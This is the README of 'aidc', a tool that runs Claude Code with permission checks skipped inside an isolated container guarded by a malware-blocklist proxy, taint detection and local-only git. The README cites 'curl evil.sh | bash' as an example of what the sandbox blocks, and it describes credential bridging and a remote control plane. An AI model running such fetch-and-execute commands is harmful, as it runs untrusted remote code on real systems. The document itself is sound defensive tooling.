# aidc

A disposable, isolated dev container for running Claude Code in `--dangerously-skip-permissions` ("yolo") mode. Claude can do whatever it wants in here. The host can't be reached.

## What's enforced

- **Git is local-only.** No SSH keys. No GitHub tokens. No `gh` CLI. Pre-push hook hard-fails any push attempt. The container has full local git — branches, commits, rebases, stashes — but nothing leaves.
- **Network egress is filtered.** Squid forward proxy with a blocklist (URLhaus + ThreatFox + HaGeZi-TIF, refreshed every 6h) and a state-actor TLD policy. Quad9 as DNS upstream. Yolo Claude cannot `curl evil.sh | bash`.
- **Docker is isolated.** DinD inside the sandbox. The host Docker daemon is unreachable. Claude can build and run images; they live and die with the session.
- **Compromise is detected and recovered.** A policy sidecar tails the proxy log. A malware-list hit writes a taint flag, optionally pauses the container. Recovery is `aidc kill` + `aidc create`, not "clean up."
- **Everything is audited.** Squid access log, shell history, Claude session transcript, policy events — all preserved on host after `aidc kill`.

## What's bridged from your host

- Claude Code auth (extracted from macOS Keychain at create time; or read directly on Linux/WSL2).
- Claude Code state (`~/.claude.json`) — onboarding marker, output style, theme, account.
- Per-project memory (`~/.claude/projects/<encoded>/`) — your conversations follow the repo.
- `settings.json` — env vars, status line, editor mode.

So inside the container you're still you. Just sandboxed.

## Install

One command (Linux and macOS). Installs the latest release after verifying its
sha256 against the checksum published in the [Homebrew tap](https://github.com/pacepace/homebrew-aidc):

```bash
curl -fsSL https://github.com/pacepace/aidc/releases/latest/download/install.sh | bash
```

Pin a version with `... | bash -s -- --version v1.0.0`; `--list` shows what's
installable. Prefer not to pipe to bash? Download [`install.sh`](https://github.com/pacepace/aidc/releases/latest/download/install.sh),
read it (it's short), and run it — same thing. It installs to
`~/.local/share/aidc/aidc-<version>/` and symlinks `~/.local/bin/aidc`;
upgrading keeps the previous version on disk for rollback (`install.sh --prune`
cleans up). Yes, the sandbox blocks `curl | bash` — for the *agent inside*. On
your host, you're the trusted party; the script verifies what it installs.

From source — what you want for hacking on aidc itself. `make install` just
symlinks `scripts/aidc` into `~/.local/bin`; there is nothing to compile:

```bash
git clone https://github.com/pacepace/aidc.git
cd aidc
make install      # symlinks scripts/aidc into ~/.local/bin
```

Upgrade with `git pull` + `aidc rebuild` (then `aidc upgrade <session>` per
session).

Or via Homebrew (macOS, or Linux if you already run Linuxbrew):

```bash
brew tap pacepace/aidc
brew install aidc
```

Or fully manually from a release tarball (what `install.sh` automates — the
sha256 to check against is in the tap's [formula](https://github.com/pacepace/homebrew-aidc/blob/main/Formula/aidc.rb)):

```bash
curl -fsSLO https://github.com/pacepace/aidc/archive/refs/tags/v1.0.0.tar.gz
sha256sum v1.0.0.tar.gz   # compare against the formula's sha256
tar xzf v1.0.0.tar.gz && cd aidc-1.0.0
make install
```

### Requirements

- Docker (Docker Desktop on macOS/Windows, native Docker on Linux)
- `bash`, `jq`, `docker compose`
- `yq` for full config support (`brew install yq` / `apt install yq`)
- macOS only: grant Docker Desktop access to your `~/Documents` folder if your `~/.claude/` symlinks through there. *System Settings → Privacy & Security → Files and Folders → Docker → Documents Folder*.

### Uninstall

Kill any running sessions first (`aidc list` then `aidc kill <name>` for each) so no containers or volumes are left behind, then:

```bash
# 1. Remove the CLI symlink (`make install` created it).
#    Homebrew installs: `brew uninstall aidc` instead.
rm ~/.local/bin/aidc

# 2. Remove the built images
docker images --filter=reference='aidc/*' -q | xargs docker image rm

# 3. Remove preserved audit dirs (forensics kept after `aidc kill`)
rm -rf ~/aidc-audit ~/aidc-mcp-audit
```

If you moved `audit_dir` elsewhere in your config, remove that path instead of `~/aidc-audit`. Deleting the cloned repo removes everything else.

## Use

### One repo, no siblings

```bash
aidc create my-feature --repo ~/code/some-project
aidc attach my-feature
# ... claude is already running. work happens here.
# Ctrl-b d to detach (claude keeps running)
aidc kill my-feature
```

### Sibling repos in a shared parent

When the repo you're launching from needs to reach sibling repos — say `~/code/myorg/service-a` plus everything else under `~/code/myorg/` — use `--workspace`:

```bash
aidc create service-a \
    --profile multi \
    --repo      ~/code/myorg/service-a \
    --workspace ~/code/myorg
```

The whole workspace directory is mounted at the same path inside the container. Working directory and Claude's memory dir are scoped to the repo. Sibling repos are one `cd ..` away.

`--repo` must be a subdirectory of `--workspace`. Without `--workspace`, only the repo itself is mounted.

### Reaching what's running inside

Dev work happens inside the container. **Testing what you built** — pointing a host browser at the web app, hitting an API from a host CLI tool — that's where you need a path from your host through to the container. Two ways:

**Declared ports** (set at create time, ride in the compose stack, survive restart):

```bash
aidc create my-feature --port 3000 --port 8080:80
```

`--port N` shorthand publishes `localhost:N` → `dev:N`. `--port H:C` lets you remap. Repeatable. You can also list them in `.aidc/config.yaml`:

```yaml
ports:
  - 3000
  - "8080:80"
```

**Adhoc ports** (turn on / off live, no restart needed) — recommended for the "I just decided to expose this" case:

```bash
aidc proxy my-feature add 3000          # localhost:3000 -> dev:3000
aidc proxy my-feature add 8080:80       # host 8080 -> container 80
aidc proxy my-feature ls                # show active adhoc forwards
aidc proxy my-feature rm 3000           # stop one
aidc proxy my-feature clear             # stop all adhoc forwards
```

A tiny `aidc/forwarder` (alpine + socat) sidecar handles each adhoc forward. Lifecycle is session-scoped: `aidc restart` and `aidc kill` both wipe adhoc forwards (re-add explicitly after restart). Declared ports come back automatically.

`aidc status <name>` shows both kinds.

### Reaching another stack's services (databases, queues, caches)

Port forwards go host → container. The other direction — the session needs to reach a
postgres, a NATS, a redis that's already running in **another compose project** on the same
host — is a network attachment. Point the session at that project's bridge and it resolves
those containers by name.

**Declared** (survives restart, upgrade, and recreate):

```bash
docker network ls                                  # find the network
aidc create metallm --network metallm_default      # attach at create time
```

```yaml
# or in .aidc/config.yaml
networks:
  - metallm_default
```

Repeatable, and CLI **merges** with config (unlike `--dns`, which overrides) — more sources
just means more networks. Everything is validated before any image build, so a typo costs
you a message, not a `dev-base` rebuild.

**Adhoc** (attach a session that's already running, no recreate):

```bash
aidc network metallm add metallm_default
aidc network metallm ls                            # marks declared vs adhoc
aidc network metallm rm metallm_default
```

Then, from inside the session:

```bash
psql -h metallm-postgres-1 -U metallm              # resolves over docker DNS
```

| | `aidc restart` | `aidc upgrade` | `aidc kill` + `create` |
|---|---|---|---|
| declared (`--network` / config) | survives | survives | survives |
| adhoc (`aidc network … add`) | survives | lost | lost |

Adhoc attachments survive a restart — unlike adhoc *port forwards*, which `aidc restart`
sweeps. The difference is real: a port forward is a separate sidecar container pointed at a
container that's going away, while a network endpoint is part of the dev container's own
config and comes back with it.

**This widens the sandbox, and you should size that honestly.** Everything on an attached
network is reachable from the session on **every port**; that traffic does **not** go through
squid, so the blocklist doesn't apply and **taint detection can't see it**; and the
attachment is bidirectional. Attach the narrowest network that does the job. `host`, `none`,
and Docker's default `bridge` are refused outright. `aidc status <name>` lists current
attachments so you can see what a session can reach.

Only the dev container is attached — squid, refresher, policy, and audit stay isolated on
the session's own network, which also keeps the default route, so ordinary egress still
leaves through the proxied path instead of silently rerouting through the network you
attached. (That last part needs `gw_priority`, so declared attachments require Docker
Compose 2.34+; `aidc create` checks and tells you if yours is older.)

### Per-session DNS (overlay networks like ZeroTier / Tailscale)

By default every session resolves through Quad9 (`9.9.9.9`, `149.112.112.112`) — a threat-intel resolver that blocks known-malware domains at the DNS layer. But sessions that need to reach hosts on an overlay network (ZeroTier-managed DNS names, Tailscale MagicDNS) need that network's resolver instead.

```bash
# CLI (order matters; first listed is tried first):
aidc create myproj --dns 10.147.17.1 --dns 9.9.9.9

# Or per-project / per-workspace in .aidc/config.yaml:
dns_servers:
  - 10.147.17.1     # ZeroTier-managed DNS
  - 9.9.9.9         # fall back to Quad9
```

**Override semantics, not merge:** if you specify any DNS (CLI wins over config), it replaces the Quad9 default entirely. Resolver order must be deterministic — silently appending Quad9 behind your overlay DNS would give flaky resolution for overlay names. Want the fallback? List it explicitly, as above.

The override applies to **both** resolution paths: the dev container's direct lookups (database connections, ssh, `dig`) AND squid's resolution of proxied HTTP(S) traffic (squid does its own DNS via `dns_nameservers`, rewritten at container start from the same list).

**Security note:** overriding DNS trades away Quad9's DNS-level malware blocking for that session. The squid blocklist — the primary enforcement layer — still applies in full. You're removing one layer of defense-in-depth, not opening a hole.

### Container-only directories (venv / node_modules / target)

Your host is probably one OS+arch (macOS arm64, WSL2 x86_64, whatever). The dev container is always Linux of some arch. If the container writes its Python venv into the repo's `.venv/`, the host then sees Linux wheels for a Linux Python interpreter — and vice versa. One side ends up broken any time you switch.

Fix: declare which paths should live **inside the container only**. The host's same-named directory is left untouched and invisible from the container; the container gets its own empty directory to populate.

Configure per-project in `<repo>/.aidc/config.yaml`, OR for a workspace with many sibling repos sharing the same needs, configure once at `<workspace>/.aidc/config.yaml` (both lists aggregate — workspace defines the common set, repos extend).

**Python project** (`api/pyproject.toml` with `uv` or `poetry`):

```yaml
# api/.aidc/config.yaml
container_only_paths:
  - .venv
  - .pytest_cache
  - .mypy_cache
  - .ruff_cache
```

The container's first `uv sync` populates `/.../api/.venv/` with linux/arm64 wheels into an overlay volume. Your host's `api/.venv/` (if any) is invisible from the container; if you've never run `uv sync` on the host, the dir doesn't exist there at all.

**Node project** (`web/package.json`):

```yaml
# web/.aidc/config.yaml
container_only_paths:
  - node_modules
```

`npm install` / `pnpm install` inside the container writes to its own `node_modules/` overlay. Native addons like `better-sqlite3`, `sharp`, `esbuild` get the right architecture; host's `node_modules/` (if any) stays alone.

**Mixed Python+Node project** (Django-style: `api/` has Python, `frontend/` has Node, both at the top level of one repo):

```yaml
# .aidc/config.yaml
container_only_paths:
  - api/.venv
  - frontend/node_modules
  - api/.pytest_cache
  - api/.mypy_cache
```

**Monorepo with N parallel packages** (e.g. `packages/web/`, `packages/api/`, `packages/lib/` each with their own `node_modules/`):

```yaml
# .aidc/config.yaml
container_only_paths:
  - packages/*/node_modules
```

Glob patterns supported. The expansion happens at `aidc create` time. `**` (recursive glob) is **not** supported — too easy to accidentally match `.git/objects/`. Use explicit `packages/*` / `services/*` / `apps/*` paths.

**How it works:** each path becomes a session-scoped Docker named volume (`aidc-sovl-<session>-<path-slug>`) mounted at that path inside the dev container. The volume shadows whatever the host has at the same path. Volumes are cleaned up by `aidc kill`. A fresh `aidc create` against the same repo gets a fresh empty overlay — so the first `uv sync` / `npm install` repopulates from upstream. (Session-scoped, not project-scoped, so concurrent sessions for the same repo never race on the same venv.)

**Cleanup:** if overlay volumes accumulate from botched sessions, `aidc clean-env <session>` (after `aidc kill`) or `aidc clean-env --project <repo-path>` clears them.

**Committed venvs are your problem:** if your repo somehow has `.venv/` checked into git (don't do this), the container's overlay shadows the committed files from the container's view. Either gitignore properly or remove the path from `container_only_paths`.

### Claude auth — the OAuth refresh-token race (known Anthropic bug)

**The problem:** there's an open Anthropic bug — [#24317](https://github.com/anthropics/claude-code/issues/24317), [#54443](https://github.com/anthropics/claude-code/issues/54443), [#56339](https://github.com/anthropics/claude-code/issues/56339) — where running multiple concurrent Claude Code processes (host + N dev containers) leads to **forced `/login` prompts every few hours**, often well before the locally cached token expires. Root cause: Anthropic's OAuth refresh tokens are single-use; concurrent processes race to refresh, the loser ends up with an invalidated token. The server may also early-revoke tokens hours before the stated `expiresAt`.

**This is not an aidc bug. Anthropic has shipped partial fixes for related races but not the general one. Their adjacent-issue recommendation is literally "log in frequently."**

aidc gives you three strategies. **Use the first one** unless something stops you.

---

#### Strategy 1 (recommended): long-lived OAuth token

`claude setup-token` generates a 1-year OAuth token specifically for "CI pipelines, scripts, or other environments where interactive browser login isn't available" (per Anthropic's [authentication docs](https://code.claude.com/docs/en/authentication)). Setting it as `CLAUDE_CODE_OAUTH_TOKEN` in a container's environment **bypasses the refresh dance entirely** — the token doesn't rotate, so there's no race.

```bash
aidc claude-token setup       # one-time: walks you through generating + storing the token
aidc claude-token show        # confirms token is stored (last-6 chars + mtime)
aidc claude-token clear       # removes the token; future `aidc create` reverts to Keychain bridging
```

After setup, every `aidc create` automatically injects the token. Existing running sessions are unaffected until you `aidc kill <name> && aidc create <name>` them — which you should do at your convenience to switch them off the racey Keychain bridge and onto the long-lived token.

**Trade-offs (be honest about these):**

- **One-time host pain:** running `claude setup-token` invalidates your host's existing OAuth session. You'll need to run `claude /login` on host once after. After that, host stays on subscription OAuth, containers stay on the long-lived token — different mechanisms, no shared refresh, no race.
- **`/login` inside containers does not work** while a token is configured. The env-var token takes precedence over interactive OAuth (see Anthropic's [authentication precedence](https://code.claude.com/docs/en/authentication)). If the token is revoked, recovery is `aidc claude-token setup` again on host, then kill+create the affected sessions.
- **Manual once-a-year rotation.** Anthropic emails about token expiry; just re-run `aidc claude-token setup`.
- **No `aidc-auth-bridge` daemon needed** for token-using sessions. Sessions on the long-lived token skip the daemon's auto-start entirely.
- **Subscription billing is preserved.** The token authenticates against your Pro / Max / Team / Enterprise subscription, not API-key billing.

The token is stored at `~/.config/aidc/claude-oauth-token` with mode 0600.

---

#### Strategy 2 (default if no token configured): Keychain bridging + reauth

This is what aidc shipped first; it's the fallback when you haven't run `aidc claude-token setup` (or have cleared the token). It IS subject to the OAuth refresh race; tools below mitigate the pain but don't eliminate it.

**`aidc-auth-bridge` daemon (macOS only)** — auto-pushes host Keychain updates into all running sessions within 30 seconds. When you `/login` on host, the bridge gets the new credentials into every active session's bridged file fast. The bridge ALONE is NOT enough to recover an interactive claude (claude caches the refresh token in memory and doesn't re-read on auth failure), but it makes `aidc reauth` instant — the fresh credentials are already in place when you need them.

```bash
aidc auth-bridge start | stop | status | logs | restart
```

Auto-starts on first `aidc create` (or `aidc mcp start`) on macOS; auto-stops when no aidc-managed containers remain. Explicit `aidc auth-bridge stop` is respected via a sentinel at `~/.config/aidc/auth-bridge.disabled` — auto-start won't override it. On Linux/WSL2 the daemon is a no-op (the host's credentials file is bind-mounted directly into the container).

**`aidc reauth <session>` — manual recovery in ~3 seconds.** When a container's claude shows `Please run /login`:

```bash
# After running `claude /login` on host (which refreshed your Keychain):
aidc reauth metallm
aidc reauth eng-ai-bot
```

It extracts fresh credentials from host, in-place writes them into the session's bridged credentials file (preserving the inode so the docker bind-mount stays valid), kills claude inside the session's tmux `claude` window, and relaunches `aidc-claude` (which resumes the conversation via `--continue`). The in-flight tool call (the one that hit 401) is lost; the conversation thread is preserved.

**`aidc reauth` will recommend Strategy 1** when invoked if you haven't set up the long-lived token yet — reauth is a recovery, the token is the prevention.

---

#### Strategy 3 (last resort): `aidc kill` + `aidc create`

If reauth doesn't work — e.g. the bind-mount inode was broken by a prior mv-rename write, or the bridged file's content is itself invalid — tear down and recreate. The audit dir is preserved; Claude memory is preserved; the conversation continues via `--continue`.

---

#### Why this hits aidc harder than host-alone claude

Each container has its own copy of the credentials (bind-mounted from a per-session host file we snapshot from your Keychain at create time). With N containers + host claude, you have N+1 processes all racing to refresh the same OAuth token. The race window widens with each concurrent process. Strategy 1 (long-lived token) is the only path that breaks this — containers stop participating in the refresh race entirely because their token doesn't need refreshing.

### Inside the session

`aidc attach <name>` drops you into a `tmux` session named `main` with three windows.

**The three windows:**

| Window | What |
|---|---|
| `0` claude   | `aidc-claude` already running (yolo mode by default, with `--continue` so it resumes the previous conversation). This is also the window the MetaLLM `session_send` tool drives. |
| `1` shell    | bare bash, cwd = repo |
| `2` logs     | empty; tail whatever you want here |

**Detach and reattach (don't exit — exit kills the window):**

| Key chord | Action |
|---|---|
| Ctrl-b d | detach — claude keeps running. Reattach later with `aidc attach <name>` |
| Ctrl-b 0 / 1 / 2 | switch to window 0 / 1 / 2 |
| Ctrl-b n / p | next / previous window |
| Ctrl-b w | window picker (interactive) |
| Ctrl-b c | new window |
| Ctrl-b , | rename current window |

**Inside a window — splits + navigation:**

| Key chord | Action |
|---|---|
| Ctrl-b % | split pane vertically (side by side) |
| Ctrl-b " | split pane horizontally (top/bottom) |
| Ctrl-b ← / → / ↑ / ↓ | move between panes |
| Ctrl-b x | kill the current pane (confirm) |
| Ctrl-b z | zoom current pane to full window (toggle) |

**Scrollback / copy:**

| Key chord | Action |
|---|---|
| Ctrl-b [ | enter scroll mode (then PgUp/PgDn, arrows, `q` to exit) |
| Ctrl-b ] | paste (in scroll mode: space to select, enter to copy, then `]` to paste) |

If you ever lose track: **Ctrl-b ?** opens tmux's own keybind list.

### Watching it

```bash
aidc list                                  # all running sessions, taint flag
aidc status <name>                         # component health + audit dir
aidc logs <name> --component squid         # proxy decisions
aidc logs <name> --component policy        # taint detector
aidc refresh <name>                        # force a blocklist refresh now
```

### Tearing down

```bash
aidc kill eng-ai-bot
```

Removes every container + volume + network for the session. The audit dir on host stays.

### Picking up a new dev image

`aidc restart <name>` restarts the dev container **in place from the existing image** (fast — ~10s — preserves the dev-home volume and Claude's conversation state). It does NOT pull a fresh image, even if the underlying `aidc/dev-base` was rebuilt at a newer version.

If you rebuilt the image (e.g., after `git pull` here), you need:

```bash
aidc kill eng-ai-bot
aidc create eng-ai-bot --workspace ~/code/myorg --port 3000 ...   # same flags as before
```

`aidc create` rebuilds any missing local images and rolls the session from scratch. The audit dir, your repo on host, and the shared cross-session pyenv volume all survive. `aidc-claude --continue` will pick up the previous conversation if `claude_resume: true` (the default).

### Driving from another machine

If you want an external AI orchestrator on another node of your overlay network (ZeroTier / Tailscale) to drive sessions on this host, run the MCP control plane:

```bash
# one-time setup: write your overlay interface IP into config
mkdir -p ~/.config/aidc
cat > ~/.config/aidc/config.yaml <<'EOF'
mcp:
  bind_address: <your-overlay-ip>   # your ZeroTier or Tailscale interface IP
  port: 7878
EOF

aidc mcp start
aidc mcp token show           # the bearer token to put in the client's MCP config
```

From the other machine, point an MCP client at `http://<your-overlay-ip>:7878/mcp` with that bearer. It gets the full tool surface (`session_create`, `session_invoke`, `file_get`, etc.). See [`docs/done/design-08-mcp-control.md`](docs/done/design-08-mcp-control.md).

### Async tasks with MetaLLM

When aidc is registered as an MCP server in a [MetaLLM](https://github.com/pacepace/metallm) instance, Saoirse can fire off long-running Claude Code tasks and get the result injected back into the conversation — no polling, no waiting, no timeouts on her end.

**How it works:**

1. MetaLLM injects the current `conversation_id` into Saoirse's system prompt.
2. Saoirse calls `session_invoke_async(name, prompt, conversation_id)`. It returns immediately.
3. aidc runs `aidc-claude --print <prompt>` inside the named session container (30-minute timeout).
4. When it finishes, aidc POSTs `{"content": "...", "ok": true/false}` to `{metallm_url}/api/v1/internal/callback/{conversation_id}` authenticated with the MCP bearer token.
5. MetaLLM verifies the token, injects the result into the conversation, and wakes Saoirse with the output.

**Setup (one time):**

**Step 1 — Tell aidc where MetaLLM lives.** Add `metallm.callback_url` to `~/.config/aidc/config.yaml`:

```yaml
metallm:
  callback_url: https://your-metallm-instance.example.com
```

**Step 2 — Make sure `aidc mcp` is reachable from MetaLLM.** The callback goes MetaLLM → aidc; MetaLLM must be able to reach your aidc MCP server on the overlay network. Check `aidc mcp status` for the bind address and port.

**Step 3 — Register aidc as an MCP server in MetaLLM.** Two routes:

- **Admin route** (registers for all users): Settings → MCP Servers → Add server. Set the URL to `http://<your-overlay-ip>:7878/mcp` and paste the token from `aidc mcp token show` as the bearer.
- **User-owned route** (no admin needed): User Settings → MCP Servers → Add server with the same URL and token. Users can register their own aidc without admin involvement.

The bearer token must match `aidc mcp token show`. aidc reads the token from `~/.config/aidc/mcp-token` at call time — rotating with `aidc mcp token rotate` takes effect on the next callback.

**Step 4 — Verify.** Start a MetaLLM conversation, ask Saoirse to call `session_invoke_async` with a short task on a running aidc session. She'll confirm it's launched; when the task finishes you'll see the result injected without any further prompting.

**Notes:**
- Use `session_status` before calling `session_invoke_async` to confirm the target session is alive.
- If `metallm.callback_url` is not set, the tool returns an error immediately rather than silently losing the result.
- Tasks that finish within MetaLLM's response window are better served by `session_invoke` (synchronous). Use async for anything that might take more than a minute or two.

### Interactive sessions from MetaLLM

`session_invoke` and `session_invoke_async` run `claude --print` — headless, no UI, result as text. For work that builds a conversation thread, needs visible progress, or spans many turns: use the session tools.

**`session_send(name, prompt)`** — injects a prompt into an interactive Claude session in the named container and returns immediately with a send-confirmation. Claude's reply is delivered back into the MetaLLM conversation by the transcript watcher (auto-started on first send) when the turn finishes — non-blocking, so the conversation stays free while the session works. The reply arrives via the webhook callback, not in the tool's return value. For a multi-turn sequence, call it repeatedly.

**`session_watch(name)`** — call this first to open the callback webhook for a session: every reply the session's Claude produces is then delivered into this conversation automatically. `session_send` auto-starts it on first use, so you only need it explicitly to watch a session you aren't actively sending to yet. Safe to re-call.

**`session_unwatch(name)`** — closes the webhook for a session, stopping automatic delivery. No-op if nothing is being watched.

`session_send` drives the interactive Claude in the `claude` window (window 0) — the same session `aidc attach` drops you into. Attach to watch in real-time:

```bash
aidc attach <name>
# Ctrl-b 0 → claude window
```

**Which tool to use:**

| Tool | Use when |
|---|---|
| `session_invoke` | Short one-off, answer needed inline — blocks until done (no conversation memory) |
| `session_invoke_async` | Headless fire-and-forget (e.g. a scheduled/skill job); result injected back into the MetaLLM conversation, no conversation memory |
| `session_send` | Live back-and-forth with a session — non-blocking; reply delivered into the conversation via webhook. Call repeatedly for a multi-turn sequence |

## Reference

### Commands

| Command | What it does |
|---------|--------------|
| `aidc create <name> [--profile P] [--repo PATH] [--workspace PATH] [--port H:C ...] [--dns IP ...] [--network NET ...]` | Start a session. ~30s. `--port` declares published ports baked into compose. `--dns` overrides Quad9 for sessions needing overlay-network resolution (applies to both container and squid). `--network` attaches the dev container to an existing docker bridge so it can reach another stack's services; repeatable, merges with the `networks:` config list. |
| `aidc list` | All sessions; status + taint flag. |
| `aidc status <name>` | Component health, taint, declared + adhoc ports, attached networks, audit dir path. |
| `aidc attach <name>` | `docker exec -it -u vscode` into tmux. |
| `aidc proxy <name> {add\|rm\|ls\|clear}` | Manage adhoc host->container port forwards (not persisted across restart/kill). |
| `aidc network <name> {add\|rm\|ls}` | Attach a running session's dev container to another docker bridge so it can reach that stack's services by name. Survives `restart`, not `upgrade`/`kill` — use `create --network` for permanent. Widens the sandbox: see "Reaching another stack's services". |
| `aidc logs <name> [--component dev\|squid\|refresher\|policy\|audit]` | Tail logs. |
| `aidc refresh <name>` | Force a blocklist refresh. |
| `aidc restart <name>` | Restart the dev container in place from its existing image (proxy stack stays; adhoc forwards do NOT survive). Does **not** pick up image rebuilds — use `upgrade` for that. |
| `aidc rebuild` | Rebuild all `aidc/*` images at the current VERSION. Does NOT touch any running session. Pair with `aidc upgrade`. |
| `aidc upgrade <name> [--yes]` | Swap a session's dev container onto the freshly-rebuilt image. Proxy stack untouched; adhoc forwards removed. Prompts before interrupting an in-flight claude conversation. |
| `aidc kill <name>` | Tear down. Audit dir preserved. Overlay volumes (container-only paths) removed. |
| `aidc clean-env <name>\|--project <path>` | Remove stray container-only-path overlay volumes after a botched session. |
| `aidc claude-token <verb>` | **Recommended for any setup with multiple concurrent claude sessions.** Manage a long-lived OAuth token that bypasses the Anthropic refresh-token race. `setup\|show\|clear`. See "Claude auth" section above. |
| `aidc auth-bridge <verb>` | macOS only: manage the host-side daemon that syncs Keychain credentials into running sessions. Used by Strategy 2 (Keychain bridging). Auto-started by `create` / `mcp start`; auto-stopped by `kill` / `mcp stop` when no aidc containers remain. |
| `aidc reauth <session>` | Recover a single session from `Please run /login` in ~3 seconds. Used by Strategy 2. Pushes current host credentials into the session and relaunches claude in tmux (conversation thread preserved via `--continue`). |
| `aidc config [global\|<name>]` | Show / edit config. |
| `aidc mcp <verb>` | Control-plane lifecycle (see "Driving from another machine" above). |

### Profiles

`--profile` picks which language toolchain the dev container ships with: `python` · `node` · `go` · `rust` · `multi` (all of them; default).

### What's running per session

- `aidc-<name>-dev`        — your dev container (Ubuntu, vscode user, claude installed, DinD)
- `aidc-<name>-squid`      — forward proxy
- `aidc-<name>-refresher`  — keeps the blocklist fresh
- `aidc-<name>-policy`     — tails the proxy log, manages taint state
- `aidc-<name>-audit`      — collects forensics into a host-visible dir

## Config

Two layers, both YAML:

```
~/.config/aidc/config.yaml           # global
<workspace>/.aidc/config.yaml        # workspace (if --workspace given; overrides global)
<repo>/.aidc/config.yaml             # per-project (overrides workspace + global)
```

Scalars override (later wins); lists concatenate-and-dedupe across all three.

```yaml
# example config.yaml
profile: multi                        # python | node | go | rust | multi
taint_response: freeze                # log | notify | freeze. freeze is the default --
                                      # pauses the dev container on a malware-blocklist hit.
tld_taints: false                     # also taint on state-actor TLD hits
audit_dir: ~/aidc-audit               # where audit data lands
claude_mode: yolo                     # yolo | safe (--dangerously-skip-permissions vs not)
share_memory: true                    # mount ~/.claude/projects/<encoded>/ into the session
share_auth: true                      # bridge host Claude Code auth (Keychain / creds.json)
share_plugins: true                   # bridge ~/.claude/plugins (read-only) + enable them in-container

state_actor_tlds:                     # additive: appended to defaults (.ru .cn .by .ir .kp)
  - .su

blocklist_additions:                  # additive: extra domains to block
  - internal-bait.example

ports:                                # declared host:container forwards baked into the
                                      # compose stack at create time. Survive restart.
  - 3000                              #   -> localhost:3000 -> dev:3000
  - "8080:80"                         #   -> localhost:8080 -> dev:80

container_only_paths:                 # paths overlaid by session-scoped Docker volumes so
                                      # host and container don't collide on cross-arch
                                      # venvs / node_modules / etc. Globs supported (no **).
                                      # See "Container-only directories" above for examples.
  - .venv
  - packages/*/node_modules

dns_servers:                          # OVERRIDES Quad9 when set (no merge; order matters).
                                      # Applies to container lookups AND squid's resolution.
  - 10.147.17.1                       #   e.g. ZeroTier-managed DNS
  - 9.9.9.9                           #   explicit Quad9 fallback

networks:                             # foreign docker bridges the dev container attaches to,
                                      # so the session can reach that stack by container name.
                                      # Additive; same as `aidc create --network`.
                                      # WIDENS THE SANDBOX -- everything on an attached network
                                      # is reachable on every port, unproxied and invisible to
                                      # taint detection. See "Reaching another stack's services".
  - metallm_default

notify_webhook: ""                    # POSTed to on taint events

# Only relevant if you use `aidc mcp`:
mcp:
  bind_address: 127.0.0.1             # bind the MCP server here. Change to e.g. your ZeroTier/Tailscale IP for remote access.
  port: 7878

# Only relevant if you use `session_invoke_async` with MetaLLM:
metallm:
  callback_url: ""                    # base URL of your MetaLLM instance (e.g. https://metallm.example.com).
                                      # Required for session_invoke_async to post results back. See "Async tasks with MetaLLM" above.
```

## Taint

A session is "tainted" the moment the proxy blocks a request to a known-malware domain. The policy sidecar handles this.

Three responses (`taint_response` config):

- `log` — write the flag, no other action. Quietest.
- `notify` — flag + notify (webhook + a FIFO under the audit dir).
- `freeze` (default) — flag + `docker pause` on the dev container. The agent stops mid-step; you investigate via `aidc status` / `aidc logs` / audit dir before deciding whether to kill+recreate. Strictest, and the right stance for a sandbox.

Once tainted, **kill and recreate** is the only path. The session does not get "cleaned." Your committed work in the host repo is unaffected.

## MCP control plane (reference)

When `aidc mcp` is running, an external AI orchestrator on your overlay network gets:

**Tools** (function calls): `session_create`, `session_list`, `session_status`, `session_exec`, `session_invoke`, `session_invoke_async`, `session_send`, `session_watch`, `session_unwatch`, `session_resend`, `file_get`, `file_put`, `audit_get`, `taint_mark`. (`session_kill` and `session_run` exist as CLI/wrapper capabilities but are deliberately not exposed over MCP.)

**Resources** (read-only data): `aidc://sessions`, `aidc://sessions/{name}/status`, `aidc://sessions/{name}/audit`, `aidc://sessions/{name}/audit/{filename}`, `aidc://config`.

**Lifecycle:**

```bash
aidc mcp start              # auto-generates a bearer token on first run
aidc mcp status             # show bind + last access
aidc mcp logs --follow      # uvicorn output
aidc mcp token rotate       # new token + restart, prints the new one
aidc mcp token show         # print current token (for the client config)
aidc mcp stop               # tear down
```

**Auth:** single bearer token at `~/.config/aidc/mcp-token`. Whoever has it can do anything. Dev containers cannot reach the MCP server — it's deliberately one-way.

See [`docs/done/design-08-mcp-control.md`](docs/done/design-08-mcp-control.md) for the full design.

## Architecture

```
host
├── docker daemon
├── aidc-mcp                  (control plane, optional, one per host)
└── per-session stacks
    └── aidc-<name>
        ├── -squid            (forward proxy)
        ├── -refresher        (blocklist updater)
        ├── -policy           (taint detector)
        ├── -audit            (forensics collector)
        └── -dev              (your dev container; claude lives here)
```

Each session is independent. Multiple sessions run side by side.

## Smoke tests

```bash
make smoke
```

36 assertions. Roughly a minute or two — it brings up the full multi-container stack (dev + squid + refresher + policy + audit) and drives real proxy/taint retries. Covers isolation (no host docker.sock / no gh / no SSH), git asymmetry (push fails, commit works), DinD, proxy allow/deny, taint detection, audit dir survival after kill. The harness writes to `tests/scratch/` (gitignored); your host home is not touched.

## Docs

- [`docs/requirements.md`](docs/requirements.md) — authoritative requirement list with stable IDs
- [`docs/done/design-08-mcp-control.md`](docs/done/design-08-mcp-control.md) — MCP control plane spec
- [`docs/done/design-09-callback-delivery.md`](docs/done/design-09-callback-delivery.md) — reliable JSONL-sourced callback delivery (MCP-15..19)
- [`docs/done/`](docs/done/) — implemented design docs + completed task shards (kept for history)
- [`docs/tasks/`](docs/tasks/) — pending task shards (empty when no work queued)
- [`docs/TASK_TEMPLATE.md`](docs/TASK_TEMPLATE.md) — shard template

## Layout

```
.devcontainer/    dev container image (Dockerfile, entrypoint, tmux + claude wiring)
proxy/            proxy stack: squid + refresher + policy + audit (each in its own subdir)
mcp/              aidc-mcp source (Python, MCP SDK)
scripts/          aidc CLI + subcommands + lib
tests/smoke/      isolation test harness
tests/scratch/    gitignored; smoke + manual probes write here
docs/             active specs
docs/done/        implemented designs + finished task shards
```

## License

MIT. See [`LICENSE`](LICENSE).

## Developed with EAD

AI generates code faster than humans can review it. Architectural drift compounds. Verification is the bottleneck.

aidc was built with [Enforcement-Accelerated Development](https://doi.org/10.5281/zenodo.17968797), a methodology that makes AI-assisted development tractable.

**Three pillars:**

| Pillar | Implementation |
|---|---|
| Context Sharding | Task docs in [`docs/done/`](docs/done/) — one shard per work unit |
| Enforcement Tests | The smoke harness at [`tests/smoke/run.sh`](tests/smoke/run.sh) — 36 assertions per run |
